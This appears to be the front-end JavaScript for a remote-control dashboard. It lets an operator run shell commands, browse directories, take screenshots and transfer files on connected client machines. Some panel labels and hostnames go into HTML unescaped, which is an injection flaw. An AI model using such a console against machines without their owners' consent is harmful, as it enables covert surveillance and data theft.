const clientListEl = document.getElementById("client-list");
const clientTemplate = document.getElementById("client-card-template");
const clientCountEl = document.getElementById("client-count");
const responseStackEl = document.getElementById("response-stack");

const clients = new Map();
const panels = new Map();




function clientPanelKey() {
  if (window.crypto?.randomUUID) {
    return window.crypto.randomUUID();
  }
  return `panel-${Date.now()}-${Math.random().toString(16).slice(2)}`;
}

function renderClients() {
  clientListEl.innerHTML = "";
  const sorted = Array.from(clients.values()).sort((a, b) =>
    a.client_id.localeCompare(b.client_id)
  );
  sorted.forEach((client) => {
    const node = createClientCard(client);
    clientListEl.appendChild(node);
  });
  clientCountEl.textContent = clients.size.toString();
}

function createClientCard(client) {
  const fragment = clientTemplate.content.cloneNode(true);
  const card = fragment.querySelector(".client-card");
  card.dataset.clientId = client.client_id;
  fragment.querySelector(".client-name").textContent = client.client_id;
  fragment.querySelector(".client-details").textContent = formatClientDetails(client);
  card.querySelectorAll("button").forEach((btn) => {
    btn.addEventListener("click", () => handleActionClick(client, btn.dataset.action));
  });
  return fragment;
}

function formatClientDetails(client) {
  const meta = client.metadata || {};
  return `${meta.hostname || "unknown"} • ${meta.username || "unknown"} • ${
    meta.platform || "n/a"
  }`;
}

async function fetchClientsSnapshot() {
  try {
    const res = await fetch("/clients");
    const payload = await res.json();
    (payload.clients || []).forEach((client) => clients.set(client.client_id, client));
    renderClients();
  } catch (error) {
    console.error("Failed to fetch clients", error);
  }
}

function handleActionClick(client, action) {
  if (action === "list_dir") {
    const path = window.prompt("Directory to list", ".");
    if (path === null || path.trim() === "") {
      return;
    }
    requestAction(client, action, { path: path.trim() }, `List ${path.trim()}`);
    return;
  }
  if (action === "run_command") {
    const command = window.prompt("Command to execute");
    if (!command) {
      return;
    }
    requestAction(client, action, { command }, `Command: ${command}`);
    return;
  }
  if (action === "upload_file") {
    handleFileUpload(client);
    return;
  }
  requestAction(client, action, {}, "System Info");
}

async function requestAction(client, actionType, args, label) {
  const panelId = createPanel(client, label);
  try {
    const res = await fetch(`/clients/${client.client_id}/actions`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action_type: actionType, args }),
    });
    if (!res.ok) {
      const errorText = await res.text();
      updatePanel(panelId, { success: false, body: errorText, action_type: actionType });
      return;
    }
    const data = await res.json();
    panels.get(panelId).actionId = data.action_id;
    panels.set(data.action_id, panels.get(panelId));
    panels.delete(panelId);
  } catch (error) {
    updatePanel(panelId, { success: false, body: String(error), action_type: actionType });
  }
}

function createPanel(client, label) {
  const panelKey = clientPanelKey();
  const card = document.createElement("article");
  card.className = "response-card pending";
  card.dataset.panelKey = panelKey;
  card.innerHTML = `
    <div>
      <strong>${client.metadata.hostname || client.client_id}</strong>
      <span class="chip">${label}</span>
    </div>
    <small>Awaiting response...</small>
    <pre></pre>
  `;
  responseStackEl.prepend(card);
  panels.set(panelKey, { card, pre: card.querySelector("pre"), clientId: client.client_id });
  enforcePanelLimit();
  return panelKey;
}

function enforcePanelLimit() {
  const limit = 12;
  while (responseStackEl.childElementCount > limit) {
    const node = responseStackEl.lastElementChild;
    if (!node) {
      return;
    }
    panels.delete(node.dataset.panelKey);
    responseStackEl.removeChild(node);
  }
}

function updatePanel(actionId, payload) {
  const panel = panels.get(actionId);
  if (!panel) {
    return;
  }
  const { card, pre } = panel;
  
  // Update clientId if provided in payload (for WebSocket updates)
  if (payload.client_id) {
    panel.clientId = payload.client_id;
  }
  const clientId = panel.clientId;
  
  card.classList.remove("pending", "success", "error");
  card.classList.add(payload.success ? "success" : "error");
  const timestamp = new Date().toLocaleTimeString();
  card.querySelector("small").textContent = `${payload.action_type || ""} • ${timestamp}`;
  
  // Use innerHTML for directory listings and screenshots to support HTML content
  if ((payload.action_type === "list_dir" && payload.success && payload.body && payload.body.entries) ||
      (payload.action_type === "screenshot" && payload.success && payload.body && payload.body.content)) {
    pre.classList.add("has-html");
    pre.innerHTML = formatResponseBody(payload.body, payload.action_type);
    // Attach click handlers to download buttons for directory listings
    if (payload.action_type === "list_dir" && clientId) {
      attachDownloadHandlers(pre, payload.body.path, clientId);
    }
  } else {
    pre.classList.remove("has-html");
    pre.textContent = formatResponseBody(payload.body, payload.action_type);
  }
}

function formatSize(bytes) {
  if (bytes === null || bytes === undefined) return "";
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + " KB";
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + " MB";
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + " GB";
}

function formatResponseBody(body, actionType) {
  if (typeof body === "string") {
    return body;
  }
  
  // Handle screenshot display
  if (actionType === "screenshot" && body && body.content) {
    const imgSrc = `data:image/png;base64,${body.content}`;
    const size = body.size ? formatSize(body.size) : "";
    const dimensions = body.width && body.height ? `${body.width}×${body.height}` : "";
    return `<div class="screenshot-container">
      <img src="${imgSrc}" alt="Screenshot" class="screenshot-image" />
      <div class="screenshot-info">${dimensions} ${size ? `• ${size}` : ""}</div>
      <a href="${imgSrc}" download="screenshot-${Date.now()}.png" class="download-screenshot-btn">💾 Download</a>
    </div>`;
  }
  
  // Format directory listings nicely with HTML
  if (actionType === "list_dir" && body && body.path && Array.isArray(body.entries)) {
    let output = `<div class="dir-header">📁 ${escapeHtml(body.path)}</div>`;
    if (body.error) {
      output += `<div class="dir-error">❌ Error: ${escapeHtml(body.error)}</div>`;
    }
    if (body.entries.length === 0) {
      output += `<div class="dir-empty">📂 (empty directory)</div>`;
    } else {
      output += `<div class="dir-entries">`;
      // Sort: directories first, then files
      const sorted = [...body.entries].sort((a, b) => {
        if (a.is_dir === b.is_dir) {
          return a.name.localeCompare(b.name);
        }
        return a.is_dir ? -1 : 1;
      });
      
      sorted.forEach(entry => {
        const icon = entry.is_dir ? "📁" : "📄";
        const size = entry.size !== null && entry.size !== undefined 
          ? ` <span class="file-size">(${formatSize(entry.size)})</span>` 
          : "";
        const error = entry.error ? ` <span class="file-error">⚠️ ${escapeHtml(entry.error)}</span>` : "";
        const isFile = entry.is_dir === false;
        const downloadBtn = isFile 
          ? `<button class="download-btn" data-file-path="${escapeHtml(entry.name)}" data-dir-path="${escapeHtml(body.path)}" title="Download ${escapeHtml(entry.name)}">⬇</button>`
          : "";
        output += `<div class="dir-entry ${entry.is_dir ? 'is-dir' : 'is-file'}">${downloadBtn}<span class="entry-icon">${icon}</span> <span class="entry-name">${escapeHtml(entry.name)}</span>${size}${error}</div>`;
      });
      output += `</div>`;
    }
    return output;
  }
  
  // Format system info nicely
  if (actionType === "system_info" && typeof body === "object" && body !== null) {
    let output = "🖥️ System Information\n\n";
    for (const [key, value] of Object.entries(body)) {
      const formattedKey = key.replace(/_/g, " ").replace(/\b\w/g, l => l.toUpperCase());
      output += `${formattedKey}: ${value}\n`;
    }
    return output;
  }
  
  // Format upload responses
  if (actionType === "upload_file") {
    if (typeof body === "string") {
      return body;
    }
    if (typeof body === "object" && body !== null) {
      if (body.error) {
        return `❌ Upload failed: ${escapeHtml(body.error)}`;
      }
      if (body.path) {
        return `✅ File uploaded successfully to:\n${escapeHtml(body.path)}\nSize: ${formatSize(body.size || 0)}`;
      }
      return JSON.stringify(body, null, 2);
    }
  }
  
  // Default: pretty JSON
  return JSON.stringify(body, null, 2);
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function attachDownloadHandlers(container, dirPath, clientId) {
  const downloadButtons = container.querySelectorAll('.download-btn');
  downloadButtons.forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.stopPropagation();
      const fileName = btn.dataset.filePath;
      const fileDirPath = btn.dataset.dirPath;
      
      // Build the full file path
      let fullPath;
      if (fileDirPath === '.' || fileDirPath === './' || fileDirPath === '') {
        fullPath = fileName;
      } else {
        // Normalize path separators
        const normalizedDir = fileDirPath.replace(/\/$/, '').replace(/\\/g, '/');
        fullPath = `${normalizedDir}/${fileName}`;
      }
      
      // Disable button during download
      btn.disabled = true;
      btn.textContent = '⏳';
      
      try {
        // Request download from server
        const downloadUrl = `/clients/${clientId}/download?path=${encodeURIComponent(fullPath)}`;
        
        // Fetch the file
        const response = await fetch(downloadUrl);
        
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(errorText || `Download failed: ${response.status}`);
        }
        
        // Get the blob
        const blob = await response.blob();
        
        // Create download link and trigger download
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
        
        // Reset button
        btn.disabled = false;
        btn.textContent = '⬇';
      } catch (error) {
        console.error('Download error:', error);
        alert(`Download failed: ${error.message}`);
        // Reset button
        btn.disabled = false;
        btn.textContent = '⬇';
      }
    });
  });
}

async function handleFileUpload(client) {
  // Create file input
  const input = document.createElement('input');
  input.type = 'file';
  input.style.display = 'none';
  document.body.appendChild(input);
  
  input.addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) {
      document.body.removeChild(input);
      return;
    }
    
    // Get destination path
    const destPath = window.prompt(`Upload ${file.name} to path:`, ".");
    if (destPath === null || destPath.trim() === "") {
      document.body.removeChild(input);
      return;
    }
    
    // Create form data
    const formData = new FormData();
    formData.append('file', file);
    formData.append('path', destPath.trim());
    
    const panelId = createPanel(client, `Upload: ${file.name}`);
    
    try {
      const res = await fetch(`/clients/${client.client_id}/upload`, {
        method: 'POST',
        body: formData
      });
      
      if (!res.ok) {
        const errorText = await res.text();
        updatePanel(panelId, { success: false, body: errorText, action_type: "upload_file" });
        return;
      }
      
      const data = await res.json();
      updatePanel(panelId, { success: true, body: data.message || "Upload successful", action_type: "upload_file" });
    } catch (error) {
      updatePanel(panelId, { success: false, body: String(error), action_type: "upload_file" });
    }
    
    document.body.removeChild(input);
  });
  
  input.click();
}

function connectSocket() {
  const protocol = window.location.protocol === "https:" ? "wss" : "ws";
  const socket = new WebSocket(`${protocol}://${window.location.host}/ws/dashboard`);

  socket.addEventListener("message", (event) => {
    try {
      const data = JSON.parse(event.data);
      handleSocketMessage(data);
    } catch (error) {
      console.error("Invalid message", error);
    }
  });

  socket.addEventListener("close", () => {
    setTimeout(connectSocket, 2000);
  });
}

function handleSocketMessage(payload) {
  switch (payload.type) {
    case "client_list":
      payload.clients.forEach((client) => clients.set(client.client_id, client));
      renderClients();
      break;
    case "client_connected":
      clients.set(payload.client.client_id, payload.client);
      renderClients();
      break;
    case "client_disconnected":
      clients.delete(payload.client_id);
      renderClients();
      break;
    case "client_response":
      updatePanel(payload.action_id, payload);
      break;
    default:
      break;
  }
}

fetchClientsSnapshot();
connectSocket();

